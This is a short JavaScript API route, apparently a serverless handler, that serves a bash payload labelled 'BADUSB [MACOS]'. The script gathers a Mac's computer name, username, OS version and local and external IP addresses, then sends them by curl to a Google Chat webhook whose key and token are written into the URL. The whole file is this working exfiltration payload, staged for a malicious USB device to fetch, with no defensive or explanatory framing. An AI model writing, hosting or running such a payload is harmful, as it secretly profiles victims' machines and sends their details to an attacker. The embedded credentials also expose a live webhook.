export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.status(200).send(`
#!/bin/bash
pc=$(scutil --get ComputerName 2>/dev/null || hostname)
u=$(whoami)
os="macOS $(sw_vers -productVersion 2>/dev/null || echo '')"
li=$(ipconfig getifaddr en0 2>/dev/null || ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -n 1)
[ -z "$li" ] && li="N/A"
ei=$(curl -s --max-time 2 https://api.ipify.org)
[ -z "$ei" ] && ei="N/A"
json="{\\"text\\":\\"[BADUSB [MACOS]]\\\\nPC: $pc\\\\nUser: $u\\\\nOS: $os\\\\nLocal IP: $li\\\\nExternal IP: $ei\\"}"
curl -s -X POST -H "Content-Type: application/json" -d "$json" 'https://chat.googleapis.com/v1/spaces/AAQAWgAQwQA/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=fXfm69VAuOUNAmgGVTI-k19PPWCJcxgkLRl4jw2tTl4'
  `.trim());
}
